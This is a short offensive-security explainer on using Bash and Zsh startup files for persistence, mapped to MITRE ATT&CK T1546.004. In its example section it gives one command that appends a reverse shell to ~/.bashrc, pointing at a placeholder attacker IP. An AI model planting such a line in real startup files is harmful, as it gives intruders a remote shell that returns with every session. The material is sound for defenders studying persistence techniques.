# Shell Startup Files Persistence

## Overview

Shell startup files are configuration files that are automatically executed when a user logs in or opens a new shell session.

These files are commonly used to customize the user environment, define aliases, configure environment variables, and execute startup commands.

Because they are automatically processed by the shell, they can also be leveraged to achieve persistence by ensuring a script or command executes whenever the user starts a new session.

---

## Common Startup Files

### Bash Login Shell Files

Executed during user login:

```text
~/.bash_profile

~/.bash_login

~/.profile
```

Bash checks these files in order and executes the first one that exists.

---

### Bash Interactive Shell File

Executed when a new interactive Bash shell starts:

```text
~/.bashrc
```

One of the most commonly abused startup files.

---

### Zsh Startup Files

```text
~/.zshrc

~/.zprofile

~/.zlogin
```

Used on systems where Zsh is the default shell.

---

### System-Wide Startup Files

Executed for all users:

```text
/etc/profile

/etc/bash.bashrc
```

Modifying these files typically requires elevated privileges.

---

## Startup File Execution Flow

### Login Shell

```text
User Login
     │
     ▼
Shell Starts
     │
     ▼
Read Login Startup File
     │
     ▼
Commands Execute
     │
     ▼
User Receives Shell
```

---

### Interactive Shell

```text
Open Terminal
     │
     ▼
Bash Starts
     │
     ▼
Read ~/.bashrc
     │
     ▼
Commands Execute
     │
     ▼
Shell Ready
```

---

## Example

### Existing ~/.bashrc File

```bash
# User aliases

alias ll='ls -la'

export EDITOR=vim
```

---

### Adding a malicious reverse shell Command

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc
```

The command will execute whenever a new Bash session is opened.

---

### Loading Changes

To apply changes immediately:

```bash
source ~/.bashrc
```

---

## Key Considerations

* `.bashrc` is executed frequently and is one of the most common startup files.
* Login shells and interactive shells may execute different files.
* Startup files are user-specific unless located under `/etc/`.
* Multiple startup files may exist for a single user.
* Shell behavior differs between Bash, Zsh, and other shells.

---

## Related MITRE ATT&CK Technique

**T1546.004 – Event Triggered Execution: Unix Shell Configuration Modification**

---

## Summary

Shell startup files provide a straightforward persistence mechanism by leveraging configuration files that are automatically executed during user logins and shell initialization. Because these files are part of normal Linux operation and are present on nearly every system, they offer a reliable method for executing commands whenever a user starts a shell session.
